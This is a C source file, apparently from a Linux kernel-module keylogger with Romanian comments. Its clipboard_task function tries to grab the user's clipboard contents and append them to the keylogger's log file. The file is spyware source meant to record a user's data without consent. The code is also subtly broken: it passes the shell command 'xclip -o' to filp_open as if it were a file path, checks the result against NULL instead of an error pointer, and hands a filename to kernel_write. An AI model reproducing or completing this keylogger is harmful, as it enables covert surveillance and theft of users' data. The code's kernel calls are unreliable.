#include "clipboard_task.h"

void clipboard_task(struct work_struct *work)
{
    struct KEYLOGGER *klogger = container_of(work, struct KEYLOGGER, work_clipboard);
    char cmd[] = "xclip -o";  // Folosește xclip pentru a prelua clipboard-ul
    struct file *proc_file;
    char output[CLIPBOARD_BUFFER_SIZE];
    loff_t pos = 0;

    // Execută comanda pentru clipboard și scrie în buffer
    if ((proc_file = filp_open(cmd, O_RDONLY, 0)) != NULL) {
        kernel_read(proc_file, output, CLIPBOARD_BUFFER_SIZE - 1, &pos);
        output[CLIPBOARD_BUFFER_SIZE - 1] = '\0';
        filp_close(proc_file, NULL);

        strncpy(klogger->clipboard.clipboard_read_buffer, output, CLIPBOARD_BUFFER_SIZE);
        klogger->clipboard.clipboard_read_buffer_offset = strlen(output);

        char*aux=klogger->clipboard.clipboard_read_buffer;
         klogger->clipboard.clipboard_read_buffer=klogger->clipboard.clipboard_write_buffer;
        klogger->clipboard.clipboard_write_buffer=aux;
        memset(klogger->clipboard.clipboard_read_buffer,0,CLIPBOARD_BUFFER_SIZE);
        klogger->clipboard.clipboard_read_buffer_offset=0;

        // Scrie clipboard-ul în log
        kernel_write(klogger->filename, klogger->clipboard.clipboard_write_buffer, CLIPBOARD_BUFFER_SIZE, &(klogger->offset_in_file));
    }
}
